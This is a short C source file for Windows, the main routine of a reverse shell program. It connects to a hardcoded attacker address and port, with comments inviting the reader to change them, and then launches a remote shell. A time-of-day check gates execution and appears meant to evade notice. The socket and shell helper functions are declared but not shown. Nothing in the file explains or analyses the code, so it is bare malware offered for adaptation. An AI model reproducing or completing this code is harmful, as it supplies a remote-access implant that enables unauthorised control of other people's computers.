// main.c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <time.h>

// Function declarations
SOCKET create_socket(const char *ip_addr, int port);
void create_reverse_shell(SOCKET sock);

int main() {
    char *ip_addr = "10.0.2.15"; // Change to your IP
    int port = 9001;            // Change to your port

    // Conditional execution: Get current hour
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    
    // Define valid hour range (for example, between 9 AM and 5 PM)
    int start_hour = 9;
    int end_hour = 17;

    // Check if current hour is within the valid range
    if (tm.tm_hour >= start_hour && tm.tm_hour < end_hour) {
        // Step 1: Create socket
        SOCKET sock = create_socket(ip_addr, port);
        if (sock == INVALID_SOCKET) {
            return 1;
        }

        // Step 2: Launch reverse shell
        create_reverse_shell(sock);

        // Clean up
        closesocket(sock);
        WSACleanup();
    } else {
        printf("Execution conditions not met. Exiting...\n");
    }

    return 0;
}
